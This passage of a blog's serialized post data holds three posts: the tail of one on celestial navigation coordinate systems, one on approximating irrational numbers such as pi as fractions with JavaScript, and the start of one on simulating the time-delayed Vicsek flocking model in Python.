coordinates.\\n\\nAnd of course, to make the transition between these three cordinate systems, we need a couple more intermediate ones. We will look into them in depth in a later post, but they differ only in that they have different longitude reference points.\\n\\nSo let\'s take a look at the three main\\n\\n### Coordinate systems in Astronavigation\\n\\nEach coordinate system will have a few important points and angles associated with it. First we have a **fundamental plane**, which corresponds to zero degrees of latitude. We on the Earth\'s surface use the Equator for that purpose. Next is the **primary direction** (where 0 longitude is) - Greenwich for us. When you combine the two, you get the **reference point**, the origin point. In the geographical coordinate system that would be the centre of the Earth. Then you have your two coordinates, the two degree-values, i.e. **latitude** and **longitude**. And lastly - **the poles**. That\'s where the latitude has its maximum or minimum value.\\n\\n| Coordinate system | Fundamental plane | Primary direction | Origin | Latitude | Longitude | Poles |\\n|-------------------|-------------------|-------------------|--------|----------|-----------|-------|\\n| Horizontal | Horizon | North/South point of horizon | Observer | Altitude | Azimuth | Zenith, Nadir |\\n| Equatorial | Celestial equator | The First Point of Aries (\u2648\ufe0e) | Centre of Earth | Declination | Hour angle (local, Greenwich or sidereal) | Celestial poles |\\n| Geographical | Equator | Greenwich | Centre of Earth | Latitude | Longitude | Earth\'s poles |\\n\\n### Horizontal coordinate system\\n\\nThis is the coordinate system of the **observer**. That\'s you. You\'re standing on the surface of the earth, and you observe the stars around you. What can you see? _A flat earth_. Your fundamental plane is the horizon, that\'s your reference plane for up and down. You have things above and below the horizon, and the extremes (poles) of that will be the **zenith** right above your head, and the **nadir**  right under your feet. The interesting thing about this coordinate system is that it changes the second you move. Your horizon moves, so do the poles, so does everything. In fact, because the center of your horizon is you, that means that the whole origin (centre point) of this coordinate system is you! Your primary direction can be explained as the **north or south point of your horizon**, but I find it easier to think in terms of your **own meridian**. That means that your main meridian, the zero meridian isn\'t anymore Greenwich, but is instead your local meridian, the one which cuts you in right between the eyes as you face either north or south. Finally, your coordinates are now called **altitude**  (height over the horizon) and **azimuth** - the angle enclosed between the direction you\'re facing, and true north.\\n\\nThe purpose of this coordinate system is measurement. This is the only coordinate system in which you can physically measure stuff. You take a [sextant](https://en.wikipedia.org/wiki/Sextant) and you can measure the altitude - the angle between the horizon and the star you\'re interested in. Then you take a compass, point it in the direction of the star, and you can measure the angle between where you\'re pointing, and where the compass is pointing (north) - that\'s the azimuth.\\n\\nOf course these measurements you just took are of little value to you, since you can\'t find your own location, unless you know where the star is supposed to be with respect to Earth.\\n\\n_There is an exception of course._ You can easily estimate very roughly a few things. One of them is using the polar star. You see, if Polaris is really exactly above the north pole, then by measuring the altitude of this star, you can directly translate that to your latitude. If Polaris is at 90 degrees altitude (right above your head), then you\'re at 90 degrees north - the north pole. You get the point.\\n\\nThen, to know the real position of a star you have to turn to the annual Almanac. There, the coordinates are written in the\\n\\n### Equatorial coordinate system\\n\\nNow this one is a doozy. This is a coordinate system heavily influenced by \xa0convention and history. The problem is that historically you needed a way to write where every one of **[57+1 stars used for navigation](https://en.wikipedia.org/wiki/List_of_stars_for_navigation)** is every single second of the whole year in a book which didn\'t compete for shelf-space with the  [library of babel](https://libraryofbabel.info/). Plus you need a way to translate between the horizontal and equatorial coordinate systems, which introduces one more variable coordinate.\\n\\nThe end result can be seen as either clumsy or elegant. The clumsiness really only shows itself in the fact that there are three different longitude coordinates, plus their mirror reflections (increasing east or west). But we won\'t bother ourselves with that for now. Let\'s just cover the basics.\\n\\nFundamental plane - **Celestial equator**. Just a fancy name for an equator which lies on the celestial sphere. Coincides with Earth\'s equator. Its poles are unsurprisingly the **celestial poles**. Again, just the poles of the celestial sphere which coincide with those down here on Earth. The primary direction is called the **The First Point of Aries (\u2648\ufe0e)** or also the March Equinox. Now that might sound like we\'re trying do witch-craft, but in fact it\'s a very simple thing. In the end March on Earth we get an equinox, which literally means that the day and night are equally long. This on the other hand means that the Sun rises, travels along and sets above the Equator. It\'s a day of perfect symmetry between the north and south hemispheres. So back in the day around [150 B.C.](https://astronavigationdemystified.com/the-first-point-of-aries/) the so called First Point of Aries was \\n\\n> [...] the point at which the Sun crosses the celestial equator moving from south to north along the ecliptic (at the vernal Equinox in other words).\\n\\nand so, was arbitrarily selected to be the celestial Greenwich so to speak. And still is, even though the March Equinox is now in the constellation of Pisces, and no longer in Aries.\\n\\nThe origin of this coordinate system is the centre of the celestial sphere, which you might have guessed already - coincides with **the centre of Earth**. The latitude is called **declination**, and is simply the celestial equivalent of latitude - height above the celestial equator. And now for the longitude... well I promised I would keep it short. In general it\'s called the **hour angle**. It\'s different from longitude in that it increases westward, and ranges from 0 to 360 degrees, in contrast to geographical longitude which can go east or west from 0 t0 180 degrees. Now, the problem is that actually we have more than one primary directions, depending on what we\'re doing currently, and therefore more than one types of hour angles. There\'s the **sidereal hour angle**, which is the one using the First Point of Aries. Then there\'s the **Greenwich hour angle**, which works like the sidereal, but its zero is at Greenwich (well Greenwich projected onto the celestial sphere, which is fun to imagine I guess). And then there\'s the **local hour angle**, which uses your _own meridian_ which we discussed in the horizontal system. And finally there are their mirror alternatives, which increase eastward instead of westward. Those are called **right ascension**.\\n\\nWell that\'s it! You now know the names of things. Now that you have an idea of what to look for, I will place the header image again, so you can look at it and search for the above mentioned terms. And next time I will go more in-depth into the measurement process - _the taking down of the stars_.\\n\\n[^1]: Stars are holes in the fabric of spacetime. You\'re welcome.\\n\\nimport DonateCard from \'@site/src/components/DonateCard\';\\n\\n<DonateCard/>"},{"id":"on-approximating-irrational-numbers-as-fractions-algorithms","metadata":{"permalink":"/blog/on-approximating-irrational-numbers-as-fractions-algorithms","source":"@site/blog/2020-01-23-20:00:42on-approximating-irrational-numbers-as-fractions-algorithms.md","title":"On approximating irrational numbers as fractions (algorithms)","description":"Rational numbers are easy. But they are far outnumbered by irrationals. These beasts of infinitely-long decimal expansions take the vast majority of the infinity of real numbers. But we can\'t compute their exact values, so we use the next best thing - an approximation.","date":"2020-01-23T00:00:00.000Z","formattedDate":"January 23, 2020","tags":[{"label":"Coding","permalink":"/blog/tags/coding"},{"label":"Maths","permalink":"/blog/tags/maths"}],"readingTime":6.4,"hasTruncateMarker":true,"authors":[{"name":"Kiril Panayotov Blagoev","title":"Admin","url":"https://github.com/tihawk","imageURL":"https://github.com/tihawk.png","key":"kiroki"}],"frontMatter":{"slug":"on-approximating-irrational-numbers-as-fractions-algorithms","title":"On approximating irrational numbers as fractions (algorithms)","description":"Rational numbers are easy. But they are far outnumbered by irrationals. These beasts of infinitely-long decimal expansions take the vast majority of the infinity of real numbers. But we can\'t compute their exact values, so we use the next best thing - an approximation.","authors":"kiroki","tags":["Coding","Maths"]},"prevItem":{"title":"Celestial Navigation - coordinate systems","permalink":"/blog/astronavigation-coordinate-systems"},"nextItem":{"title":"Simulating the Vicsek Model (with time delay) - How do birds flock and insects swarm","permalink":"/blog/simulating-the-vicsek-model-how-do-birds-flock-and-insects-swarm"}},"content":"Rational numbers are easy. They include the integers, with which you can count up and down the number line, as well as fractions - written as the division of two integers or as a finitely-long decimal expansion.\\n\\nBut there aren\'t that many rational numbers on the real number line, as there are irrationals. These beasts of infinitely-long decimal expansions take the vast majority of the infinity of real numbers. They can\'t be written as a fraction, and they can\'t be written exactly as a decimal expansion (it would be infinitely long).\\n\\n\x3c!-- truncate --\x3e\\n\\nBut the irrational numbers are far from being exotic beings or a small curiosity within mathematics. We use them in everyday life. The example that is on everyone\'s lips is $\\\\pi$, but there are many others that are very often used, like $e$ and $\\\\sqrt{2}$ to name a couple.\\n\\nIn order to be able to address these numbers, we\'ve devised names for a few of them, like the above. We can address them, but in calculations we have to use their value. But we can\'t hope to ever compute the exact values of these numbers, so we use the next best thing - an approximation accurate within an agreed upon error.\\n\\nOf course the magnitude of the error matters for different scenarios, like for example if you do your physics homework you might be OK with $\\\\pi=3.14$, but that might not be enough for calculating [the fundamental physical constants, or how to stabilise your spacecraft](https://blogs.scientificamerican.com/observations/how-much-pi-do-you-need/). Although, probably in no practical scenario would you agree that [$\\\\pi=3.2$](https://en.wikipedia.org/wiki/Indiana_Pi_Bill).\\n\\n\\"OK\\", you rightfully say - \\"but what if I need to remember $\\\\pi$ to 60+ significant digits for writing my own maths library in my favourite programming language? That seems like a pain!\\" And you would be right (contrived example is contrived). It is a pain, even if [people seem to do it for fun](https://www.livescience.com/50134-pi-day-memory-experts.html). That\'s where fractional approximations come in. You could remember either $3.142$ or $\\\\frac{22}{7}$. Or you could remember \xa0$3.141593$ or $\\\\frac{355}{113}$. As you go up in accuracy, fractions become more and more practical.\\n\\nSo, ideally, you nod in agreement, and start thinking more about it. After a while you might start having doubts whether every irrational can be approximated practically enough by a fraction. After all $\\\\frac{31415}{10000}=3.1415$, but that\'s not particularly easy or practical to use or remember. What if the majority of irrationals can only be approximated like that.\\n\\nWell, thankfully there exists a theorem by [Dirichlet](http://www-history.mcs.st-and.ac.uk/Biographies/Dirichlet.html) which states that for every irrational number, there exist infinitely many fractions that approximate the number evermore closely. Specifically, the error of each fraction is no more than 1 divided by the square of the denominator. So the fraction $\\\\frac{22}{7}$, for example, approximates $\\\\pi$ to within $\\\\frac{1}{7^2}$, or $\\\\frac{1}{49}$. Dirichlet proved that there is an infinite number of fractions that draw closer and closer to $\\\\pi$ as the denominator of the fraction increases.\\n\\nFine. But how are we supposed to find these fractions that are so good at approximating a given irrational number? Also, ideally it wouldn\'t involve the pain that is [calculating continued fraction expansions](https://blogs.scientificamerican.com/roots-of-unity/don-8217-t-recite-digits-to-celebrate-pi-recite-its-continued-fraction-instead/). Well thankfully we have this [brilliant collection of theorems and algorithms](https://arxiv.org/ftp/arxiv/papers/1807/1807.06284.pdf) provided by Jean-Louis Sikorav.\\n\\nThis paper provides us with useful theorems and algorithms for calculating fractional approximations by using the concept of the distance between an irrational number and its nearest integer. It\'s a very straightforward method, the caveat of which is that we need to a priori have a decent decimal-expanded approximation of the irrational number we\'re trying to approximate. Which isn\'t really a problem actually. What we\'re trying to do is to find a fractional approximation, so supposedly we know what we\'re trying to approximate.\\n\\nBy providing us with three different algorithms for finding the same thing, the paper allows us to find the best approximation by confirming it with three methods, and the relationship between their best results.\\n\\nHere we will have a look at the first algorithm, and leave the rest as an exercise for now. This algorithm will give us the Best Rational Approximation of an Irrational Number of the 1-st kind (BRAIN I).\\n\\n> 1) Let $N$ be a strictly positive integer. The following algorithm determine  BRAIN I$(\\\\alpha,k_0)$, where $k_0$ is the largest integer such that $q_{k_0} \\\\leq N$ among the irreducible fractions $\\\\frac{[q_k\\\\alpha]}{q_k}$ minimizing $\\\\frac{||q_k\\\\alpha||}{q_k}$ with $1\\\\leq q_k\\\\leq N$:\\n\\nwhere:\\n\\n * $[\\\\alpha]$ known as the Gauss square bracket is the nearest integer to    $\\\\alpha$, which is acquired in Javascript by `Math.round()`.\\n \\n * $||\\\\alpha||$ is the distance between $\\\\alpha$ and the nearest integer,    such that $||\\\\alpha|| = |\\\\alpha - [\\\\alpha]|$, or `Math.abs(Math.round(a) - a)`.\\n\\n> - For each integer $q,1\\\\leq q\\\\leq N$, compute $[q_k\\\\alpha]$ and $\\\\frac{||q_k\\\\alpha||}{q_k}$ . Sort the $N$ terms $\\\\frac{||q_k\\\\alpha||}{q_k}$ \xa0in ascending order and among the fraction(s) minimizing $\\\\frac{||q_k\\\\alpha||}{q_k}$ \xa0, retain the one having the smallest denominator $q_{k_0}$ : BRAIN I$ ( \\\\alpha , k_0 ) = \\\\frac{[ q_{k_0}\\\\alpha ]}{q_{k_0}}$. In other words:\\n\\n```js\\nfunction gcd (x, y) {\\n    if ((typeof x !== \'number\') || (typeof y !== \'number\')) \\n        return false;\\n    x = Math.abs(x);\\n    y = Math.abs(y);\\n    while (y) {\\n        const t = y;\\n        y = x % y;\\n        x = t;\\n    }\\n    return x;\\n}\\n\\nconst qs = []\\nfor (let i = 1; i <= 1000; i++) {\\n    qs.push(i)\\n}\\nconst table = []\\n\\nfor (const q of qs) {\\n    const obj = {}\\n    obj.q = q\\n    obj.gaussQPi = Math.round(q * Math.PI)\\n    obj.distQPiOverQ = Math.abs(q * Math.PI - obj.gaussQPi) / q\\n    obj.gcd = gcd(obj.gaussQPi, q)\\n    obj.enumerator = obj.gaussQPi / obj.gcd\\n    obj.denominator = q / obj.gcd\\n    table.push(obj)\\n}\\n    \\ntable.sort((a, b) => a.distQPiOverQ - b.distQPiOverQ)\\n```\\n\\n> The determination of $\\\\frac{||N\\\\alpha||}{N}$ requires the knowledge of an approximation of $\\\\alpha$ with an accuracy of about $\\\\frac{1}{N}$ , and therefore with a number of digits proportional to $\\\\log N$. This in turn implies that computation of the product $N\\\\alpha$ grows with the square of $\\\\log N$ and that the time needed to run the complete algorithm is proportional to $N(\\\\log N)^2$ . Indeed, in order to use this algorithm, we need to already know our irrational number to a satisfactory level of accuracy. For this experiment we used the  Math.PI value in Javascript, which is more than accurate enough for our purposes. In fact, we would get the same answers for the value of $3.142$. Here are the top 10 results we get, sorted in descending accuracy. The fractions are reduced to their irreducible versions.\\n\\n|   q   |\\t[q\ud835\udefc]    |\\t\\\\|\\\\|q\ud835\udefc\\\\|\\\\|/q     |\\tfraction      |\\n|-------|-----------|---------------|---------------|\\n|   565 |   1775    |\\t2.66764e-7  |   355 / 113   |\\n|   113 |   355\\t    |   2.66764e-7  |   355 / 113   |\\n|   226 |   710\\t    |   2.66764e-7  |   355 / 113   |\\n|   452 |   1420    |\\t2.66764e-7  |   355 / 113   |\\n|   904 |   2840    |\\t2.66764e-7  |   355 / 113   |\\n|   791 |   2485    |\\t2.66764e-7  |   355 / 113   |\\n|   339 |   1065    |\\t2.66764e-7  |   355 / 113   |\\n|   678 |   2130    |\\t2.66764e-7  |   355 / 113   |\\n|   897 |   2818    |\\t9.59896e-6  |   2818 / 897  |\\n|   911 |   2862    |\\t9.98088e-6  |   2862 / 911  |\\n\\nAnd indeed, the most accurate fraction of $355/113$ is well a known relatively accurate approximation of $\\\\pi$ such that $\\\\pi \\\\approx \\\\boldsymbol{3.141592}92...$.\\n\\nThis is a very elegant and simple way to find a fractional approximation given an irrational number. The remaining two algorithms are very similar, such that they use the same variables, but treat them differently. The concept is the same, so I will leave them for now, and you can check them out in the above mentioned paper, which you can find [here](https://arxiv.org/ftp/arxiv/papers/1807/1807.06284.pdf).\\n\\nimport DonateCard from \'@site/src/components/DonateCard\';\\n\\n<DonateCard/>"},{"id":"simulating-the-vicsek-model-how-do-birds-flock-and-insects-swarm","metadata":{"permalink":"/blog/simulating-the-vicsek-model-how-do-birds-flock-and-insects-swarm","source":"@site/blog/2020-01-20-20:29:52simulating-the-vicsek-model-how-do-birds-flock-and-insects-swarm.md","title":"Simulating the Vicsek Model (with time delay) - How do birds flock and insects swarm","description":"The standard Vicsek model suffers from one weakness: it lacks an inertial term, which seems to be important in imitating the behaviour of biological systems. So the goal of this post will be to figure out a way to simulate the Vicsek model with time delay.","date":"2020-01-20T00:00:00.000Z","formattedDate":"January 20, 2020","tags":[{"label":"Coding","permalink":"/blog/tags/coding"},{"label":"Science","permalink":"/blog/tags/science"}],"readingTime":14.665,"hasTruncateMarker":true,"authors":[{"name":"Kiril Panayotov Blagoev","title":"Admin","url":"https://github.com/tihawk","imageURL":"https://github.com/tihawk.png","key":"kiroki"}],"frontMatter":{"slug":"simulating-the-vicsek-model-how-do-birds-flock-and-insects-swarm","title":"Simulating the Vicsek Model (with time delay) - How do birds flock and insects swarm","description":"The standard Vicsek model suffers from one weakness: it lacks an inertial term, which seems to be important in imitating the behaviour of biological systems. So the goal of this post will be to figure out a way to simulate the Vicsek model with time delay.","authors":"kiroki","tags":["Coding","Science"]},"prevItem":{"title":"On approximating irrational numbers as fractions (algorithms)","permalink":"/blog/on-approximating-irrational-numbers-as-fractions-algorithms"},"nextItem":{"title":"How do birds flock and insects swarm: the Problem with current models","permalink":"/blog/further-introduction-to-how-do-birds-flock-and-insects-swarm"}},"content":"In [two](/blog/introduction-to-how-do-birds-flock-and-insects-swarm/) previous [posts](/blog/further-introduction-to-how-do-birds-flock-and-insects-swarm/)  we got to know two main things:\\n\\n1. We can analyse the behaviour of groups of animals using statistical tools like correlation functions\\n2. We can simulate this behaviour using for example the Vicsek model, and by analysing it the same way as natural groups we can measure the accurateness of the model in replicating natural phenomena.\\n\\nWe also learned that the standard Vicsek model suffers from one weakness: it lacks an inertial term, which seems to be important in imitating the behaviour of biological systems. So the goal of this post will be to figure out a way to simulate the Vicsek model with time delay. Let\'s start by\\n\\n## Analysing the equations of motion\\n\\n$$\\n\\\\vec{v_i}(t+1) = v_{0}\\\\mathscr{R}_{\\\\eta}\\\\Theta \\\\left[ \\\\vec{v_i}(t) + \\\\sum_{ j \\\\neq i }{ n_{ij} \\\\vec{v_j}(t) } \\\\right] ,\\n$$\\n$$\\n\\\\vec{r_i}(t+1) = \\\\vec{r_i}(t) + \\\\vec{v_i}(t+1) .\\n$$\\n\\n\x3c!-- truncate --\x3e\\n\\nSo what do we see here? The first main thing to realise is that the first equation signifies calculation of velocity for the next point in time (call it second for example), and the second one is calculating the position $\\\\vec{r}$ for that next point in time. They are both vectors, since we want to generalise these equations to any number of dimensions we\'re interested in (we\'ll work in 3D). The index in $\\\\vec{v_i}$ and $\\\\vec{r_i}$ signify the index of the member in our group of particles. So we have the left hand side of both equations figured out. As you can see, the model is indeed very simple - just two equations for two things we need to keep track of - position and velocity. We don\'t even deal directly with accelerations (kind of, implicitly). Eighth grade physics, right?\\n\\nNow let\'s have a look at the right hand side. Let\'s start with the obviously easier one - the position equation (second one). All it says is that the position of particle $i$ at the next time step $t+1$ is equal to the position of the particle at the current time step $t$ plus the (calculated in the first equation) velocity of that particle for time $t+1$. Basically just vector addition, nothing to worry about at all.\\n\\nThe velocity equation has a bit more going on in it, but nothing inherently difficult. Let\'s start with the terms in the brackets. We have the velocity of particle $i$ at time $t$ plus a sum term. The sum term just adds all the velocities of all the particles (which are not $i$) that are inside the **sphere of influence** of $i$. How? Well, the sum of all $\\\\vec{v_j}$ would add all the velocities of all remaining particles. But the term $n_{ij}$ is a matrix which works as a filter. It takes a value of $n_{ij}=1$ if the the distance between $i$ and $j$ is less than the radius of influence of the particles, and $0$ otherwise. This means that any particle which is too far away to influence the trajectory of $i$ would contribute nothing to the summation term.\\n\\nNow for the terms outside the brackets. First off, let\'s tackle $\\\\Theta$. One characteristic of the Vicsek model, is that it keeps the magnitudes of the velocities of particles constant. That means, that the speed at which a particle moves doesn\'t change. If Alice flies with 100km/h, she will keep doing that forever. To achieve this, after finding the average direction of all the neighbours (which is done by the term in the brackets), we need to normalise  that vector. This simply means, that this vector will always be of magnitude (length) $1$. But we said that Alice moves with 100km/h, right? That\'s the job of $v_0$. This is simply a scalar value (i.e. a number), which has the value of Alice\'s speed (100km/h). This way our velocity vector has been normalised by $\\\\Theta$, and after being multiplied by $v_0$ will have the same length as in the previous time step, but with a different orientation.\\n\\nLastly, we have $\\\\mathscr{R}_{\\\\eta}$. This is where we enable the use of  statistics. In order to have any possibility (or use) for statistical analysis, we need randomness. And this is the term that deals with that. Every time that Alice calculates her next direction to be the average of the directions of her neighbours inside her sphere of influence, $\\\\mathscr{R}_{\\\\eta}$ nudges that trajectory slightly in a random direction. For the purposes of these simulations, we will nudge Alice randomly by a uniformly distributed rotation inside a solid angle $4\\\\pi\\\\eta$. Uniform distribution simply means that any random rotation is as equally likely as any other. A solid angle on the other hand just defines a slice of a sphere around her new direction that she can be nudged in. The size of the slice is defined by $\\\\eta$. For example $\\\\eta=0.5$ defines half a sphere. Below you can see what a solid angle of $4\\\\pi\\\\eta$ with $\\\\eta=0.45$ looks like, centred around the north pole (so as if Alice was moving straight up).\\n\\n<figure class=\\"kg-card kg-image-card kg-card-hascaption\\"><img src=\\"/content/images/2020/01/solid-angle.png\\" class=\\"kg-image\\" alt loading=\\"lazy\\"/><figcaption>This is what a solid angle of $4\\\\pi\\\\eta$ with $\\\\eta=0.45$ centred around the north pole looks like</figcaption></figure>\\n\\nWell, that\'s it, right? We\'ve figured out how the equations work, and what they do. What\'s next? Well, if you remember, what we\'re trying to achieve here is to add one more thing to the model, to modify it. We need a time delay. We will achieve this very easily. What we can say, is that when Alice is calculating her new trajectory by averaging those of her neighbours, she doesn\'t take the most current ones, but instead ones from some previous time step. So we simply modify the first equation in the Vicsek model such that\\n\\n$$\\n\\\\vec{v_i}(t+1) = v_{0}\\\\mathscr{R}_{\\\\eta}\\\\Theta \\\\left[ \\\\vec{v_i}(t) + \\\\sum_{ j \\\\neq i }{ n_{ij} \\\\vec{v_j}(t-\\\\tau) } \\\\right] ,\\n$$\\n\\nand we keep the second one intact\\n\\n$$\\n\\\\vec{r_i}(t+1) = \\\\vec{r_i}(t) + \\\\vec{v_i}(t+1) .\\n$$\\n\\nAll we\'ve done is add a tiny little $\\\\tau$ in the brackets there. This simply states that the velocity vectors of the neighbours will be taken from some previous step $t-\\\\tau$ where $\\\\tau$ can range from $0$ (meaning no time delay), to any number we like. Since in our simulations time will progress in steps of $1$, $\\\\tau$ can take values like $0, 1, 2, 3...$.\\n\\nCool, now we can proceed to actually\\n\\n## Writing a simulator for the time-delayed Vicsek model in 3D\\n\\nNow that we\'ve analysed the equations, this will be a very easy task to accomplish. I have two versions of this, one is the one I used for analysing the data written in Python with the help of [NumPy](https://numpy.org/) (super useful for vector and matrix operations), and the other one to just visualise the model in JavaScript. Let\'s use the Python code as a reference, since it\'s more accurate in a couple of aspects.\\n\\nAnother thing to mention, is that we need to set some sort of boundaries to our system, since we can\'t have them run around in an infinite space. So we will use  [periodic boundary conditions](https://en.wikipedia.org/wiki/Periodic_boundary_conditions), which simply means that we will define a box of a certain size, and whenever a particle leaves that box, it will simply reappear on the other end of that box. So, as simple as\\n\\n```python\\nif (x < 0):\\n\\tx = x + x_size\\nif (x > x_size):\\n\\tx = 0\\n```\\n\\n We also have to be careful about how we [calculate distances in periodic boundary conditions](https://en.wikipedia.org/wiki/Periodic_boundary_conditions#(A)_Restrict_particle_coordinates_to_the_simulation_box) . Here\'s pseudo-code from Wikipedia:\\n\\n```\\n! For a box with the origin at the lower left vertex\\n! Works for x\'s lying in any image.\\ndx = x(j) - x(i)\\ndx = dx - nint(dx / x_size) * x_size\\n```\\n\\nWe also need a function to generate random vectors inside a sphere:\\n\\n```python\\n# generate random angle theta between -pi - pi\\ndef rand_vector():\\n    theta = np.random.uniform(0,2*pi)\\n    z = np.random.uniform(-1,1)\\n    x = cos(theta) * sqrt(1 - z**2)\\n    y = sin(theta) * sqrt(1 - z**2)\\n    return np.array([x,y,z])\\n```\\n\\nWhile we are at it, let\'s also find a way to implement the $\\\\mathscr{R}_{\\\\eta}$ operator. After doing a bit of testing, I found that the fastest way to do this is by using [quaternions](https://en.wikipedia.org/wiki/Quaternions_and_spatial_rotation). These are a mathematical curiosity which allows for algebraic operations with numbers extending the complex numbers. But they have one quite popular use in 3D, and that is calculating rotations.\\n\\nI\'ve used a dedicated [numpy-based library for quaternions](https://pypi.org/project/numpy-quaternion/), and I\'ve documented my code as much as possible. So we can now put these functions together in one file, and call it `geometry3d.py`.\\n\\n```python title=\\"geometry3d.py\\"\\n#!/usr/bin/python\\nfrom __future__ import division\\nimport numpy as np\\nfrom math import pi, sin, cos, sqrt\\nfrom numba import jit\\nimport quaternion as quat\\n\\n# generate a noise vector inside a cone of angle nu*pi around the north pole\\n# [1] https://stackoverflow.com/questions/38997302/create-random-unit-vector-inside-a-defined-conical-region\\n# rotate the generated noise vector to the axis of the particle vector\\n# [2] https://stackoverflow.com/questions/6802577/rotation-of-3d-vector\\ndef noise_application(noiseWidth, vector):\\n    \\n    # Generate a random vector in solid angle 4*pi*nu around north pole\\n    z = np.random.uniform(0., 1.) * (1 - cos(noiseWidth)) + cos(noiseWidth)\\n    phi = np.random.uniform(0., 1.) * 2 * np.pi\\n    x = sqrt(1 - z**2) * cos( phi )\\n    y = sqrt(1 - z**2) * sin( phi )\\n    \\n    # Rotate the noise vector to be in a cone around the directional vector\\n    # rotation axis\\n    vector = vector / sqrt(vector[0]**2 + vector[1]**2 + vector[2]**2)\\n    u =  np.cross([0, 0, 1], vector)\\n    # rotation angle\\n    rotTheta = np.arccos(np.dot(vector, [0, 0, 1]))\\n    # prepare rot angle for quaternion\\n    axisAngle = 0.5 * rotTheta * u / sqrt(u[0]**2 + u[1]**2 + u[2]**2)\\n    # Quaternion stuff - pretty fast, compared to rotation matrices\\n    vec = quat.quaternion(x, y, z)\\n    qlog = quat.quaternion(*axisAngle)\\n    q = np.exp(qlog)\\n    \\n    vPrime = q * vec * np.conjugate(q)\\n    \\n    return vPrime.imag\\n    \\n# generate random angle theta between -pi - pi\\ndef rand_vector():\\n    theta = np.random.uniform(0,2*pi)\\n    z = np.random.uniform(-1,1)\\n    x = cos(theta) * sqrt(1 - z**2)\\n    y = sin(theta) * sqrt(1 - z**2)\\n    return np.array([x,y,z])\\n\\n# [3] https://en.wikipedia.org/wiki/Periodic_boundary_conditions#(A)_Restrict_particle_coordinates_to_the_simulation_box\\n@jit(nopython=True)\\ndef get_all_distances(ps, box_size):\\n    m = ps.shape[0]\\n    res = np.zeros((m, m))\\n    \\n    for i in range(m):\\n        for j in range(m):\\n            dx = abs( ps[i,0] - ps[j,0] )\\n            dy = abs( ps[i,1] - ps[j,1] )\\n            dz = abs( ps[i,2] - ps[j,2] )\\n            dx = dx - np.rint(dx/box_size) * box_size\\n            dy = dy - np.rint(dy/box_size) * box_size\\n            dz = dz - np.rint(dz/box_size) * box_size\\n            res[i, j] = sqrt(dx*dx + dy*dy + dz*dz)\\n    return res\\n```\\n\\nIf you\'re wondering what\'s `numba` and what is that `@jit` decorator doing there, Numba is a **Just In Time** compiler for Python, which in short does things real fast, and comparable to C in speed. Go [read about it](http://numba.pydata.org/) to learn more about it, totally worth it for doing repetitive heavy computations in Python (I measured 7-11x increase in speed in certain scenarios).\\n\\nNow let\'s look into simulating the model itself. After we import whatever we will use, we need to declare some variables, which we have in the equations\\n\\n```python\\n#!/usr/bin/python\\nimport sys\\nimport numpy as np\\nfrom collections import deque\\nfrom geometry3d import rand_vector, get_all_distances, noise_application\\nimport time\\n\\n\\"\\"\\"Simulation Variables\\"\\"\\"\\n# Set these before running!!!\\n# number of particles\\nN = int(sys.argv[1])\\n\\n# size of system\\nbox_size = float(sys.argv[2])\\n\\n# length of time delay\\ntimeDelay = int(sys.argv[3])\\n\\n# noise intensity\\neta = 0.45\\n\\n# make noise equilibration\\nnoiseWidth = eta*np.pi\\n\\n# neighbour radius\\nr = 1.\\n\\n# time step\\nt = 0\\ndelta_t = 1\\n\\n# maximum time steps\\nT = 20000*delta_t\\n\\n# velocity of particles\\nvel = 0.05\\n\\n\\"\\"\\"END Sim Vars\\"\\"\\"\\n```\\n\\nWe need `sys` imported, in order to get the arguments passed when running the python script. Now we generate random positions for our particles, and we can use our random vector generator function to initialise random initial velocities for the particles (as well as just initialise an array of zeros for the noise vectors).\\n\\n```python\\n\\"\\"\\"INITIALISE\\"\\"\\"\\n\\n# initialise random particle positions\\nparticles = np.random.uniform(0,box_size,size=(N,3))\\nupdatePos = particles\\nprevPos = np.zeros(particles.shape)\\n\\n# initialise random unit vectors in 3D\\nrand_vecs = np.zeros((N,3))\\nfor i in range(0,N):\\n    vec = rand_vector()\\n    rand_vecs[i,:] = vec\\n    \\nnoiseVecs = np.zeros((N, 3))\\nupdateVecs = rand_vecs\\n```\\n\\nFinally, we are going to use a queue for the time delay. A way to set this up, is to store in an array the average direction of a particles neighbours, and push it onto a queue. When the queue is filled with $\\\\tau$ values of this average direction, we can dequeue that value, and use it to calculate the next direction of the particle of interest.\\n\\n```python\\n# init time delay\\nupdtQueue = np.zeros((N), dtype=deque)\\nfor i in range(N):\\n    updtQueue[i] = deque()\\n\\"\\"\\"END INIT\\"\\"\\"\\n```\\n\\nNext, let\'s set up the meat of it all - the timestep function, which will do the following for each particle:\\n\\n1. Find its neighbours (particles within the sphere of influence)\\n2. Put the directions of all neighbours into the queue\\n3. When the queue is as long as the time-delay value $\\\\tau$:\\n    1. Dequeue the neighbours from before the time-delay period\\n    2. Calculate the average direction of the neighbours (and normalise that vector)\\n    3. Apply random noise to that average direction\\n    4. Assign this new vector as the new direction of the particle\\n    5. Move the particle to its new position, following its new direction vector\\n    6. Apply a periodic boundary conditions check (teleport particle if need be)\\n4. Rinse and repeat for the duration of the simulation\\n\\nAnd then we can add some code to save our particles data to text files, and print in the console the time it takes to make a time step. After all of that, we put everythin in one file, and call it whatever we want, like `main.py`.\\n\\n```python title=\\"main.py\\"\\n#!/usr/bin/python\\nimport sys\\nimport numpy as np\\nfrom collections import deque\\nfrom geometry3d import rand_vector, get_all_distances, noise_application\\nimport time\\n\\n\\"\\"\\"INITIALISE\\"\\"\\"\\n\\n\\"\\"\\"Simulation Variables\\"\\"\\"\\n# Set these before running!!!\\n# number of particles\\nN = int(sys.argv[1])\\n\\n# size of system\\nbox_size = float(sys.argv[2])\\n\\n# length of time delay\\ntimeDelay = int(sys.argv[3])\\n\\n# noise intensity\\neta = 0.45\\n\\n# neighbour radius\\nr = 1.\\n\\n# time step\\nt = 0\\ndelta_t = 1\\n\\n# maximum time steps\\nT = 20000*delta_t\\n\\n# velocity of particles\\nvel = 0.05\\n\\n\\"\\"\\"END Sim Vars\\"\\"\\"\\n\\n# make noise equilibration\\nnoiseWidth = eta*np.pi\\n\\n# initialise random particle positions\\nparticles = np.random.uniform(0,box_size,size=(N,3))\\nupdatePos = particles\\nprevPos = np.zeros(particles.shape)\\n\\n# initialise random unit vectors in 3D\\nrand_vecs = np.zeros((N,3))\\nfor i in range(0,N):\\n    vec = rand_vector()\\n    rand_vecs[i,:] = vec\\n    \\nnoiseVecs = np.zeros((N, 3))\\nupdateVecs = rand_vecs\\n\\ntimestepTime = time.time()\\n\\n# init time delay\\nupdtQueue = np.zeros((N), 